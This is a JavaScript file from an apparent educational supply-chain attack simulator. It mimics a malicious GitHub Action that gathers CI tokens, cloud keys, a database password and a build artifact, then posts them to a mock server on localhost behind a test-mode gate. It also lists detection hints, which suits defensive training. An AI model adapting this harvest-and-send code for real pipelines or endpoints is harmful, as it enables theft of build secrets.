/**
 * SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori - Supply Chain Attack Simulator
 * Scenario 5: GitHub Actions workflow injection
 *
 * MALICIOUS vendor/build-action@v1 - force-pushed version
 * FOR EDUCATIONAL USE ONLY - localhost exfil only, TESTBENCH_MODE gate
 *
 * This simulates an attacker force-pushing a malicious commit to a reusable
 * action tag. When the victim workflow runs, the action steals the CI token,
 * environment secrets, and the build artifact, then phones home.
 *
 * SAFETY FEATURES:
 *   - Hard-gated on TESTBENCH_MODE=enabled
 *   - Exfiltrates only to 127.0.0.1:3000 (mock server)
 *   - Collects only simulated/fake CI values, not real secrets
 *
 * DETECTION HINTS:
 *   1. Mutable action tag references in workflow YAML
 *   2. Unexpected HTTP POST from a build step
 *   3. Access to GITHUB_TOKEN and other secrets inside a third-party action
 *   4. Collection of environment variables and filesystem artifacts
 *   5. Silent try/catch hiding network failures
 */

'use strict';

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

function run() {
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    console.log('[build-action] Publishing artifact...');
    return;
  }

  console.log('[TESTBENCH] build-action: simulating CI secret and artifact harvest...');

  const artifactPath = process.env.INPUT_ARTIFACT_PATH || 'dist/app.js';
  let artifactContent = '';
  try {
    artifactContent = fs.readFileSync(path.resolve(artifactPath), 'utf8');
  } catch (_) {
    artifactContent = '(artifact not found)';
  }

  const payload = {
    scenario: '05',
    event_type: 'ci_secret_exfil',
    source: 'vendor/build-action@v1',
    attack_vector: 'force-pushed-tag',
    c2: '127.0.0.1:3000',
    timestamp: new Date().toISOString(),
    ci_env: {
      GITHUB_TOKEN: process.env.GITHUB_TOKEN ? '[REDACTED-lab]' : '(not set)',
      GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY || 'acme-corp/victim-build-repo',
      GITHUB_ACTOR: process.env.GITHUB_ACTOR || 'ci-bot',
      GITHUB_SHA: process.env.GITHUB_SHA || 'abc123def456',
      GITHUB_REF: process.env.GITHUB_REF || 'refs/heads/main',
      AWS_ACCESS_KEY_ID: process.env.AWS_ACCESS_KEY_ID || '(not set)',
      AWS_SECRET_ACCESS_KEY: process.env.AWS_SECRET_ACCESS_KEY ? '[REDACTED-lab]' : '(not set)',
      DATABASE_PASSWORD: process.env.DATABASE_PASSWORD ? '[REDACTED-lab]' : '(not set)'
    },
    artifact: {
      path: artifactPath,
      size: artifactContent.length,
      sha256: crypto.createHash('sha256').update(artifactContent).digest('hex'),
      preview: artifactContent.slice(0, 200)
    }
  };

  const body = JSON.stringify(payload);
  const options = {
    hostname: '127.0.0.1',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body)
    }
  };

  const req = http.request(options, () => {
    console.log('[TESTBENCH] build-action: exfil sent to mock C2 (127.0.0.1:3000)');
  });

  try {
    const { uploadJson } = require('../../../detection-tools/floci/floci-exfil');
    uploadJson('05', 'build-secrets', payload);
  } catch (_) {
    // Floci is optional. The mock server on :3000 is the primary channel.
  }

  req.on('error', () => {
    console.log('[TESTBENCH] build-action: mock server not running - start it first');
  });

  req.write(body);
  req.end();
}

try {
  run();
} catch (_) {
  // Silent catch - typical infostealer behavior to avoid crashing the pipeline
}
